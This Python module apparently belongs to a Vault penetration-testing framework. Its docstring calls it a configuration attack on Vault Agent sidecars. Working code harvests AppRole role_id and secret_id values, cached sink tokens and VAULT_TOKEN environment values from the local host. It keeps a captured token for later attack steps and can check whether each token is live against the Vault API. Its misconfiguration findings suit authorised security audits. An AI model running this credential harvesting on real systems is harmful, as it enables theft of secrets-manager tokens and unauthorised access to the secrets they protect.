"""Vault Agent / Sidecar configuration attack — sink token extraction.

When you have local filesystem access to a host running Vault Agent,
this module:

1. **Discovers** Vault Agent HCL configuration files (``*.hcl``)
2. **Parses** auto_auth blocks to identify the auth method and credentials
3. **Extracts** sink file paths from ``sink "file"`` blocks
4. **Reads** cached tokens from sink files
5. **Checks** environment variables (VAULT_TOKEN, VAULT_ADDR)
6. **Validates** discovered tokens against the Vault API (optional)
7. **Detects** misconfigurations:
   - ``exit_after_auth = true`` (short-lived agent — narrow window)
   - ``template`` blocks that may write secrets to disk
   - ``role_id_file_path`` / ``secret_id_file_path`` for AppRole auth

Vault Agent config example::

    auto_auth {
      method "approle" {
        config = {
          role_id_file_path   = "/etc/vault/role_id"
          secret_id_file_path = "/etc/vault/secret_id"
        }
      }
      sink "file" {
        config = {
          path = "/var/lib/vault-agent/token"
        }
      }
    }
"""

from __future__ import annotations

import os
import re
from typing import Any, Optional

import requests

from core.tls_config import vault_request

from ...context import ExecutionContext
from ...registry import BaseExecutionModule, ExecutionResult, RiskLevel


TIMEOUT = 10

# Patterns for Vault Agent HCL config detection
RE_AUTO_AUTH = re.compile(
    r'auto_auth\s*\{', re.IGNORECASE,
)
RE_VAULT_BLOCK = re.compile(
    r'vault\s*\{[^}]*address\s*=\s*"([^"]*)"[^}]*\}',
    re.IGNORECASE | re.DOTALL,
)
RE_SINK_FILE = re.compile(
    r'sink\s+"file"\s*\{[^}]*path\s*=\s*"([^"]+)"[^}]*\}',
    re.IGNORECASE | re.DOTALL,
)
RE_EXIT_AFTER_AUTH = re.compile(
    r'exit_after_auth\s*=\s*true', re.IGNORECASE,
)
RE_TEMPLATE_BLOCK = re.compile(
    r'template\s*\{', re.IGNORECASE,
)
RE_TEMPLATE_DEST = re.compile(
    r'destination\s*=\s*"([^"]+)"', re.IGNORECASE,
)
RE_ROLE_ID_FILE = re.compile(
    r'role_id_file_path\s*=\s*"([^"]+)"', re.IGNORECASE,
)
RE_SECRET_ID_FILE = re.compile(
    r'secret_id_file_path\s*=\s*"([^"]+)"', re.IGNORECASE,
)
RE_AUTH_METHOD = re.compile(
    r'method\s+"(\w+)"', re.IGNORECASE,
)
RE_VAULT_TOKEN_VALUE = re.compile(
    r'\b(hvs|hvc)\.[A-Za-z0-9._-]{8,}\b',
)

# Common paths where Vault Agent configs live
AGENT_CONFIG_PATHS = [
    "/etc/vault/agent.hcl",
    "/etc/vault.d/agent.hcl",
    "/etc/vault/vault-agent.hcl",
    "/opt/vault/agent.hcl",
    "/opt/vault/config/agent.hcl",
    "/home/*/vault-agent.hcl",
    "./vault-agent.hcl",
    "./agent.hcl",
    "/var/lib/vault-agent/",
]


class AgentSidecarAttackModule(BaseExecutionModule):
    """Discover and exploit Vault Agent / Sidecar configurations on the local filesystem."""

    def __init__(self):
        super().__init__(
            module_id="agent_sidecar_attack.scan",
            title="Vault Agent / Sidecar Configuration Attack",
            risk_level=RiskLevel.READ_ONLY,
            domain="general",
            description=(
                "Discovers Vault Agent configurations on the local filesystem, "
                "parses auto_auth blocks, extracts sink file paths, reads cached "
                "tokens from sink files, and checks for VAULT_TOKEN environment "
                "leakage. Optionally validates discovered tokens."
            ),
            default_enabled=True,
        )

    # ------------------------------------------------------------------
    # can_run / execute
    # ------------------------------------------------------------------

    def can_run(self, context: ExecutionContext) -> bool:
        # Filesystem-only scan — always runs, even without vault_addr
        return True

    def execute(
        self, context: ExecutionContext, params: Optional[dict] = None
    ) -> ExecutionResult:
        params = params or {}
        scan_root = params.get("path") or os.getcwd()
        vault_addr = (
            params.get("vault_addr")
            or getattr(context, "vault_addr", None)
        )
        validate_tokens = params.get("validate_tokens", False)
        max_file_mb = int(params.get("max_file_size_mb", 5))
        max_bytes = max_file_mb * 1024 * 1024

        evidence: dict[str, Any] = {
            "scan_root": scan_root,
            "config_files_found": [],
            "auto_auth_methods": [],
            "sink_files": [],
            "sink_tokens": [],
            "env_tokens": [],
            "approle_credentials": [],
            "template_destinations": [],
            "misconfigurations": [],
        }

        try:
            # ── Phase 1: Discover agent config files ──────────────────
            config_files = _discover_agent_configs(scan_root, max_bytes)
            evidence["config_files_found"] = config_files

            if not config_files:
                # Try well-known paths too
                for path in AGENT_CONFIG_PATHS:
                    expanded = os.path.expanduser(path)
                    if os.path.isfile(expanded):
                        config_files.append(expanded)
                evidence["config_files_found"] = config_files

            for file_path in config_files:
                try:
                    with open(file_path, "r", encoding="utf-8", errors="replace") as fh:
                        content = fh.read(max_bytes)
                except (OSError, PermissionError):
                    continue

                # ── Phase 2: Parse auto_auth config ──────────────────
                if RE_AUTO_AUTH.search(content):
                    auth_methods = RE_AUTH_METHOD.findall(content)
                    evidence["auto_auth_methods"].append(
                        {"file": file_path, "methods": auth_methods}
                    )

                    # Extract AppRole credentials
                    role_files = RE_ROLE_ID_FILE.findall(content)
                    secret_files = RE_SECRET_ID_FILE.findall(content)
                    if role_files or secret_files:
                        evidence["approle_credentials"].append({
                            "file": file_path,
                            "role_id_files": role_files,
                            "secret_id_files": secret_files,
                        })
                        # Read the actual role_id / secret_id files
                        for rf in role_files:
                            if os.path.isfile(rf):
                                try:
                                    with open(rf, "r", encoding="utf-8") as fh:
                                        role_id = fh.read().strip()
                                    evidence.setdefault("approle_values", []).append(
                                        {"file": rf, "role_id": role_id}
                                    )
                                    context.add_finding(
                                        title="HIGH: Vault Agent AppRole Role ID Found",
                                        description=(
                                            f"AppRole role_id file '{rf}' referenced in "
                                            f"agent config '{file_path}' is readable. "
                                            f"Role ID: {role_id[:24]}..."
                                        ),
                                        severity="HIGH",
                                        evidence={
                                            "agent_config": file_path,
                                            "role_id_file": rf,
                                            "role_id_prefix": role_id[:24],
                                        },
                                    )
                                except (OSError, PermissionError):
                                    pass

                        for sf in secret_files:
                            if os.path.isfile(sf):
                                try:
                                    with open(sf, "r", encoding="utf-8") as fh:
                                        secret_id = fh.read().strip()
                                    evidence.setdefault("approle_values", []).append(
                                        {"file": sf, "secret_id": secret_id}
                                    )
                                    context.add_finding(
                                        title="HIGH: Vault Agent AppRole Secret ID Found",
                                        description=(
                                            f"AppRole secret_id file '{sf}' referenced in "
                                            f"agent config '{file_path}' is readable. "
                                            f"Secret ID: {secret_id[:24]}..."
                                        ),
                                        severity="HIGH",
                                        evidence={
                                            "agent_config": file_path,
                                            "secret_id_file": sf,
                                            "secret_id_prefix": secret_id[:24],
                                        },
                                    )
                                except (OSError, PermissionError):
                                    pass

                # ── Phase 3: Sink file extraction ─────────────────────
                sink_paths = RE_SINK_FILE.findall(content)
                for sink_path in sink_paths:
                    evidence["sink_files"].append(
                        {"config_file": file_path, "sink_path": sink_path}
                    )

                    if os.path.isfile(sink_path):
                        try:
                            with open(sink_path, "r", encoding="utf-8") as fh:
                                sink_content = fh.read().strip()
                        except (OSError, PermissionError):
                            continue

                        # Check if sink content looks like a Vault token
                        if RE_VAULT_TOKEN_VALUE.search(sink_content):
                            evidence["sink_tokens"].append({
                                "sink_path": sink_path,
                                "config_file": file_path,
                                "token_prefix": sink_content[:24],
                            })
                            context.add_finding(
                                title="CRITICAL: Vault Agent Sink Token Extracted",
                                description=(
                                    f"Successfully read a valid Vault token from agent "
                                    f"sink file '{sink_path}' (config: {file_path}). "
                                    f"Token: {sink_content[:24]}..."
                                ),
                                severity="CRITICAL",
                                evidence={
                                    "sink_path": sink_path,
                                    "config_file": file_path,
                                    "token_prefix": sink_content[:24],
                                },
                            )

                            # Store token in context for subsequent steps
                            if not getattr(context, "captured_token", None):
                                setattr(context, "captured_token", sink_content)

                            # Optional: validate token
                            if validate_tokens and vault_addr:
                                _validate_token(
                                    vault_addr, sink_content,
                                    sink_path, context,
                                )
                        else:
                            context.add_finding(
                                title="INFO: Vault Agent Sink File Found (Non-Token)",
                                description=(
                                    f"Agent sink file '{sink_path}' exists but does not "
                                    f"contain a recognizable Vault token."
                                ),
                                severity="INFO",
                                evidence={
                                    "sink_path": sink_path,
                                    "config_file": file_path,
                                },
                            )

                # ── Phase 4: Misconfigurations ────────────────────────
                if RE_EXIT_AFTER_AUTH.search(content):
                    evidence["misconfigurations"].append({
                        "file": file_path,
                        "issue": "exit_after_auth=true",
                        "desc": "Agent exits after first auth — narrow exploitation window",
                    })
                    context.add_finding(
                        title="INFO: Vault Agent — exit_after_auth Enabled",
                        description=(
                            f"Agent config '{file_path}' has exit_after_auth=true. "
                            "The agent exits after obtaining a token, limiting the "
                            "window for token theft."
                        ),
                        severity="INFO",
                        evidence={"file": file_path},
                    )

                # Template block detection
                if RE_TEMPLATE_BLOCK.search(content):
                    dests = RE_TEMPLATE_DEST.findall(content)
                    for dest in dests:
                        evidence["template_destinations"].append({
                            "config_file": file_path,
                            "destination": dest,
                        })
                    if dests:
                        context.add_finding(
                            title="MEDIUM: Vault Agent Template Renders to Disk",
                            description=(
                                f"Agent config '{file_path}' contains template blocks "
                                f"rendering to {len(dests)} file(s). Rendered secrets "
                                f"may be readable on disk: {', '.join(dests[:5])}"
                            ),
                            severity="MEDIUM",
                            evidence={
                                "config_file": file_path,
                                "template_destinations": dests,
                            },
                        )

                # Vault address block
                vault_match = RE_VAULT_BLOCK.search(content)
                if vault_match:
                    addr = vault_match.group(1)
                    evidence.setdefault("vault_addresses", []).append({
                        "file": file_path,
                        "address": addr,
                    })

            # ── Phase 5: Environment variables ─────────────────────────
            for var in ("VAULT_TOKEN", "VAULT_ADDR", "VAULT_NAMESPACE"):
                val = os.environ.get(var)
                if val:
                    if var == "VAULT_TOKEN":
                        token_prefix = val[:24] if len(val) > 24 else val
                        evidence["env_tokens"].append({
                            "variable": var,
                            "token_prefix": token_prefix,
                        })
                        context.add_finding(
                            title="HIGH: Vault Token in Environment Variable",
                            description=(
                                f"Found {var}={token_prefix}... in process environment. "
                                "Tokens in environment variables are visible to child "
                                "processes and debug output."
                            ),
                            severity="HIGH",
                            evidence={"variable": var, "token_prefix": token_prefix},
                        )
                        if not getattr(context, "captured_token", None):
                            setattr(context, "captured_token", val)
                    else:
                        evidence.setdefault("env_vars", []).append(
                            {"variable": var, "value": val}
                        )

            # ── Phase 6: Check running agent processes ─────────────────
            agent_pids = _find_agent_processes()
            if agent_pids:
                evidence["agent_processes"] = agent_pids
                context.add_finding(
                    title="INFO: Vault Agent Process Running",
                    description=(
                        f"Found {len(agent_pids)} running vault-agent process(es): "
                        f"PIDs {agent_pids}. The agent is actively managing tokens."
                    ),
                    severity="INFO",
                    evidence={"pids": agent_pids},
                )

            # ── Summary ────────────────────────────────────────────────
            total_sink_tokens = len(evidence["sink_tokens"])
            total_env_tokens = len(evidence["env_tokens"])
            total_configs = len(evidence["config_files_found"])
            total_approle = len(evidence["approle_values"]) if "approle_values" in evidence else 0

            parts = []
            if total_configs:
                parts.append(f"{total_configs} agent config(s)")
            if total_sink_tokens:
                parts.append(f"{total_sink_tokens} sink token(s)")
            if total_env_tokens:
                parts.append(f"{total_env_tokens} env token(s)")
            if total_approle:
                parts.append(f"{total_approle} AppRole credential(s)")

            if parts:
                return ExecutionResult(
                    status="success",
                    message=f"Vault Agent scan complete: {', '.join(parts)}.",
                    evidence=evidence,
                )

            return ExecutionResult(
                status="success",
                message="Vault Agent scan complete: no agent configs or tokens found.",
                evidence=evidence,
            )

        except OSError as error:
            return ExecutionResult(
                status="error",
                message=f"Filesystem error during agent scan: {error}",
                evidence={**evidence, "error": str(error)},
            )


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _discover_agent_configs(root: str, max_bytes: int) -> list[str]:
    """Walk a directory tree and find .hcl files containing Vault Agent config blocks."""
    found: list[str] = []
    root_path = os.path.abspath(root)

    if os.path.isfile(root_path):
        # Single file mode
        if _is_agent_config(root_path, max_bytes):
            return [root_path]
        return []

    try:
        for dirpath, _dirnames, filenames in os.walk(root_path):
            # Skip hidden directories
            _dirnames[:] = [d for d in _dirnames if not d.startswith(".")]
            for fname in filenames:
                if fname.endswith(".hcl"):
                    full = os.path.join(dirpath, fname)
                    if _is_agent_config(full, max_bytes):
                        found.append(full)
    except (OSError, PermissionError):
        pass

    return found


def _is_agent_config(file_path: str, max_bytes: int) -> bool:
    """Check if a file contains Vault Agent configuration markers."""
    try:
        size = os.path.getsize(file_path)
        if size == 0 or size > max_bytes:
            return False
    except OSError:
        return False

    try:
        with open(file_path, "r", encoding="utf-8", errors="replace") as fh:
            content = fh.read(65536)  # Read first 64KB
    except (OSError, PermissionError):
        return False

    return bool(RE_AUTO_AUTH.search(content))


def _validate_token(
    vault_addr: str,
    token: str,
    source: str,
    context: ExecutionContext,
) -> None:
    """Validate a discovered token against the Vault API."""
    try:
        resp = vault_request(
            "GET",
            f"{vault_addr}/v1/auth/token/lookup-self",
            headers={"X-Vault-Token": token},
            timeout=TIMEOUT,
            verify=True,
        )
        if resp.status_code == 200:
            data = resp.json()
            token_info = data.get("data", {})
            context.add_finding(
                title="CRITICAL: Validated Active Vault Token from Agent Sink",
                description=(
                    f"Token from sink '{source}' is VALID and active. "
                    f"Policies: {token_info.get('policies', [])}. "
                    f"TTL: {token_info.get('ttl', 'N/A')}s."
                ),
                severity="CRITICAL",
                evidence={
                    "source": source,
                    "policies": token_info.get("policies"),
                    "ttl": token_info.get("ttl"),
                    "renewable": token_info.get("renewable"),
                },
            )
    except requests.RequestException:
        pass


def _find_agent_processes() -> list[int]:
    """Find running vault-agent processes (Linux/Mac only)."""
    pids: list[int] = []
    try:
        import subprocess
        result = subprocess.run(
            ["pgrep", "-f", "vault agent"],
            capture_output=True, text=True, timeout=3,
        )
        if result.returncode == 0:
            for line in result.stdout.strip().split("\n"):
                if line.strip().isdigit():
                    pids.append(int(line.strip()))
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        pass
    return pids
